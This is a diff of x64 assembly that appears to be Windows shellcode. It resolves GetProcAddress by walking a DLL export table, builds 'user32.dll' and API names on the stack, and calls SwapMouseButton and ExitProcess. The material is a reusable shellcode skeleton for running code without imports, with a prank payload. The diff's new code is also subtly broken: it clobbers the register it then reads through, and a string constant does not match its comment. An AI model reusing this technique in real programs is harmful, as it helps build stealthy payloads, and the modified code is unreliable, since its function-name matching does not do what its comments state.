@@ -33,16 +33,34 @@ _start:
 		xor rcx , rcx
 		
 		Get_fun:
-		inc rcx
+		
 		mov eax , [rsi + rcx * 4] ;RVA of next function
+		mov rax , rax
 		add rax , rbx ; VA of next function
 
-		cmp qword  [rax] , 0x41636f7250746547 ; compare first 8 chars "GetProcA"
-		jnz Get_fun
-		cmp dword  [rax + 8] , 0x65726464      ; "ddre"
-		jnz Get_fun
-		cmp word  [rax + 12] , 0x7373         ; "ss"
-		jnz Get_fun
+		mov eax, dword [rax]              ; "GetP"
+		cmp eax, 0x50746547
+		jnz Next_fun
+
+		mov eax, dword [rax + 4]          ; "rocA"
+		cmp eax, 0x41636f72
+		jnz Next_fun
+
+		mov eax, dword [rax + 8]          ; "redd"
+		cmp eax, 0x64647265
+		jnz Next_fun
+
+		mov ax, word [rax + 12]           ; "ss"
+		cmp ax, 0x7373
+		jnz Next_fun
+		
+		jmp Found_fun
+		
+		Next_fun:
+		inc rcx
+		jmp Get_fun
+		
+		Found_fun:
 		
 		;RCX = index of AddressofNames[]
 		
@@ -50,10 +68,13 @@ _start:
 
 		;optimized :
 		mov esi , [rdx + 0x24]
-		movzx ecx , word [rbx + rsi + rcx * 2]
+		add rsi , rbx
+		movzx ecx , word [rsi + rcx*2]
 		mov esi , [rdx + 0x1c]
-		mov r8 , [rbx + rsi + rcx * 4]
-		add r8 , rbx
+		add rsi , rbx
+		mov eax , [rsi + rcx *4]
+		add rax , rbx
+		mov r8 , rax
 		
 		
 		
@@ -62,8 +83,11 @@ _start:
 		
 
 		;build "LOadLibraryA" strig on stack
-		mov qword [rsp] , 0x7262694C64616F4C   ; "LoadLibr"
-		mov dword [rsp + 8] , 0x41797261         ; "aryA"
+		
+		mov rax , 0x7262694C64616F4C   ; "LoadLibr"
+		mov [rsp] , rax
+		mov eax , 0x41797261         ; "aryA"
+		mov [rsp + 8] , eax
 		xor eax , eax
 		lea rdi , [rsp + 12]
 		stosb
@@ -77,8 +101,10 @@ _start:
 		
 		
 		; --- build "user32.dll" string ---
-		mov qword [rsp] , 0x642E323372657375  ; "user32.d" (little-endian)
-		mov word [rsp + 8], 0x6C6C    ; "ll" 
+		mov rax , 0x642E323372657375  ; "user32.d" (little-endian)
+		mov [rsp] , rax
+		mov ax, 0x6C6C    ; "ll" 
+		mov [rsp+8] , ax
 		xor eax , eax
 		lea rdi , [rsp + 10]
 		stosb
@@ -90,8 +116,10 @@ _start:
 		
 		
 		; build "SwapMouseButton" string
-		mov qword [rsp] , 0x73756F4D70617753 ; 'SwapMous'
-		mov qword [rsp + 8], 0x6E6F7474754265 ; "eButton"
+		mov rax , 0x73756F4D70617753 ; 'SwapMous'
+		mov [rsp] , rax
+		mov rax, 0x6E6F7474754265 ; "eButton"
+		mov [rsp + 8] , rax
 		mov byte [rsp + 16] , 0x6E ; 'n' completes "Button"
 		xor al , al
 		lea rdi , [rsp + 17]
@@ -106,8 +134,10 @@ _start:
 		call rax          ; call SwapMouseButton(1)
 		
 		; --- build "ExitProcess" string ---
-		mov qword [rsp], 0x636f725074697845  ; "ExitProc" (little-endian)
-		mov dword [rsp + 8], 0x73736573      ; "sess"
+		mov rax, 0x636f725074697845  ; "ExitProc" (little-endian)
+		mov [rsp] , rax
+		mov eax, 0x73736573      ; "sess"
+		mov [rsp + 8] , eax
 		xor eax , eax
 		lea rdi , [rsp + 12]
 		stosb
